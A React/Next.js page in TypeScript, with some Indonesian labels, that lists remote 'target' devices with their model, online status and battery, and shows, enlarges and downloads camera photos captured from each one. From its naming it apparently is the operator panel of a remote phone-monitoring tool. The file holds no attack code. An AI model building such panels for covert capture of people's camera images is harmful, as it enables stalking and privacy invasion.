'use client';

import { useEffect, useState } from 'react';
import { Camera, ChevronDown, X, Image as ImageIcon, Download, RefreshCcw } from 'lucide-react';
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';
import { useImageCaptures } from '@/hooks/useFirebase';
import { subscribeToTargets } from '@/services/targetService';
import { Target } from '@/types/target';

const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));

export default function CameraPage() {
  const [targets, setTargets] = useState<Target[]>([]);
  const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
  const [showDropdown, setShowDropdown] = useState(false);
  const [refreshing, setRefreshing] = useState(false);

  const { images, isLoading } = useImageCaptures(selectedDeviceId ?? undefined);
  const [selectedImage, setSelectedImage] = useState<string | null>(null);

  // Load targets on mount
  useEffect(() => {
    const unsubscribe = subscribeToTargets((incomingTargets: Target[] = []) => {
      setTargets(incomingTargets);
      if (incomingTargets.length > 0 && !selectedDeviceId) {
        setSelectedDeviceId(incomingTargets[0].id);
      }
    });

    return () => unsubscribe();
  }, [selectedDeviceId]);

  const currentDevice = targets.find((t) => t.id === selectedDeviceId);

  const handleRefresh = async () => {
    setRefreshing(true);
    // Refresh akan trigger re-fetch dari hook
    setTimeout(() => setRefreshing(false), 1000);
  };

  return (
    <main className="min-h-screen bg-slate-950 px-4 py-6 text-white">
      <div className="mx-auto max-w-7xl">
        {/* Header Section */}
        <section className="rounded-[32px] border border-white/10 bg-slate-950/85 p-6 shadow-2xl shadow-slate-950/40 backdrop-blur-xl mb-6">
          <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
            <div>
              <p className="text-sm uppercase tracking-[0.3em] text-cyan-300/80">Camera Gallery</p>
              <h1 className="mt-3 text-3xl font-semibold text-white">Device Photo Vault</h1>
              <p className="mt-2 text-sm text-slate-400">
                Filter dan lihat foto dari setiap device dengan mudah
              </p>
            </div>

            {/* Stats */}
            <div className="grid gap-3 grid-cols-2">
              <div className="rounded-2xl border border-white/10 bg-white/5 p-4">
                <p className="text-xs uppercase tracking-[0.2em] text-slate-400">Total Device</p>
                <p className="mt-2 text-2xl font-semibold text-cyan-400">{targets.length}</p>
              </div>
              <div className="rounded-2xl border border-white/10 bg-white/5 p-4">
                <p className="text-xs uppercase tracking-[0.2em] text-slate-400">Device Photos</p>
                <p className="mt-2 text-2xl font-semibold text-emerald-400">{images.length}</p>
              </div>
            </div>
          </div>
        </section>

        {/* Camera Viewer Section */}
        <section className="rounded-[32px] border border-white/10 bg-slate-950/85 p-6 shadow-2xl shadow-slate-950/40 backdrop-blur-xl">
          {/* Top Bar: Device Selector + Controls */}
          <div className="flex flex-col sm:flex-row sm:items-center gap-4 mb-6">
            {/* Device Filter Dropdown */}
            <div className="relative flex-1 max-w-xs">
              <button
                onClick={() => setShowDropdown(!showDropdown)}
                className={cn(
                  'w-full flex items-center justify-between gap-3 rounded-2xl border px-4 py-3 text-sm font-bold uppercase transition-all',
                  showDropdown
                    ? 'border-cyan-400/70 bg-cyan-500/15 text-cyan-200'
                    : 'border-white/10 bg-white/5 text-slate-300 hover:border-cyan-400/40 hover:bg-white/10'
                )}
              >
                <div className="text-left">
                  {currentDevice ? (
                    <>
                      <div className="text-xs text-slate-400 font-mono">{currentDevice.id}</div>
                      <div className="text-sm font-bold text-white">
                        {currentDevice.deviceInfo?.manufacturer} {currentDevice.deviceInfo?.model}
                      </div>
                    </>
                  ) : (
                    'Select Device'
                  )}
                </div>
                <ChevronDown
                  size={16}
                  className={cn('transition-transform', showDropdown && 'rotate-180')}
                />
              </button>

              {/* Dropdown Menu */}
              {showDropdown && (
                <div className="absolute top-full mt-2 w-full rounded-xl border border-white/10 bg-slate-950/95 shadow-xl z-50 backdrop-blur-xl overflow-hidden">
                  <div className="max-h-[400px] overflow-y-auto">
                    {targets.map((device) => (
                      <button
                        key={device.id}
                        onClick={() => {
                          setSelectedDeviceId(device.id);
                          setShowDropdown(false);
                        }}
                        className={cn(
                          'w-full px-4 py-3 text-left transition-colors border-b border-white/5 last:border-0 hover:bg-white/5',
                          selectedDeviceId === device.id && 'bg-cyan-500/20 border-cyan-400/50'
                        )}
                      >
                        <div className="flex items-center justify-between">
                          <div>
                            <div className="font-mono text-xs text-slate-500">{device.id}</div>
                            <div className="font-bold text-sm text-white mt-1">
                              {device.deviceInfo?.manufacturer} {device.deviceInfo?.model}
                            </div>
                            <div className="text-xs text-slate-400 mt-1">
                              {device.status?.toUpperCase() === 'ONLINE' ? '🟢' : '🔴'} Baterai:{' '}
                              {device.battery || 0}%
                            </div>
                          </div>
                          {selectedDeviceId === device.id && (
                            <div className="w-2 h-2 bg-cyan-400 rounded-full" />
                          )}
                        </div>
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* Refresh Button */}
            <button
              onClick={handleRefresh}
              disabled={refreshing || isLoading}
              className={cn(
                'inline-flex items-center justify-center gap-2 rounded-2xl border px-5 py-3 text-sm font-bold uppercase transition-all',
                'border-emerald-400/30 bg-emerald-500/10 text-emerald-300 hover:border-emerald-400/70 hover:bg-emerald-500/20',
                (refreshing || isLoading) && 'cursor-not-allowed opacity-50'
              )}
            >
              <RefreshCcw size={16} className={cn('transition-transform', refreshing && 'animate-spin')} />
              {refreshing ? 'Loading...' : 'Refresh'}
            </button>
          </div>

          {/* Photo Gallery Grid */}
          <div className="border-t border-white/10 pt-6">
            {isLoading ? (
              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                {[...Array(8)].map((_, i) => (
                  <div key={i} className="aspect-square rounded-2xl bg-white/5 animate-pulse border border-white/5" />
                ))}
              </div>
            ) : !selectedDeviceId ? (
              <div className="py-20 text-center">
                <Camera size={48} className="mx-auto text-slate-600 mb-4" />
                <p className="text-slate-500 font-mono">Pilih device untuk melihat foto</p>
              </div>
            ) : images.length === 0 ? (
              <div className="py-20 text-center">
                <ImageIcon size={48} className="mx-auto text-slate-600 mb-4" />
                <p className="text-slate-500 font-mono">Belum ada foto dari device ini</p>
              </div>
            ) : (
              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                {images.map((img) => (
                  <div
                    key={img.id}
                    className="group relative aspect-square rounded-2xl overflow-hidden border border-white/10 bg-black/40 cursor-pointer transition-all hover:border-cyan-400/50"
                    onClick={() => setSelectedImage(img.url)}
                  >
                    <img
                      src={img.url}
                      alt="Device capture"
                      className="w-full h-full object-cover transition-transform duration-300 group-hover:scale-110"
                    />
                    {/* Overlay */}
                    <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300" />

                    {/* Bottom Info */}
                    <div className="absolute inset-x-0 bottom-0 p-3 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
                      <p className="text-[10px] text-white font-mono">
                        {new Date(img.timestamp).toLocaleString()}
                      </p>
                    </div>

                    {/* Download Badge */}
                    <div className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity">
                      <a
                        href={img.url}
                        download={img.name}
                        className="flex items-center justify-center w-8 h-8 rounded-lg bg-cyan-500/20 border border-cyan-400/50 text-cyan-300 hover:bg-cyan-500/30"
                        onClick={(e) => e.stopPropagation()}
                      >
                        <Download size={14} />
                      </a>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </section>
      </div>

      {/* Lightbox Modal */}
      {selectedImage && (
        <div
          className="fixed inset-0 z-[100] bg-black/95 backdrop-blur-md flex items-center justify-center p-4"
          onClick={() => setSelectedImage(null)}
        >
          <button
            className="absolute top-6 right-6 text-white/50 hover:text-white transition-colors z-10"
            onClick={() => setSelectedImage(null)}
          >
            <X size={32} />
          </button>
          <img src={selectedImage} alt="Full preview" className="max-w-3xl max-h-[80vh] rounded-2xl" />
        </div>
      )}
    </main>
  );
}
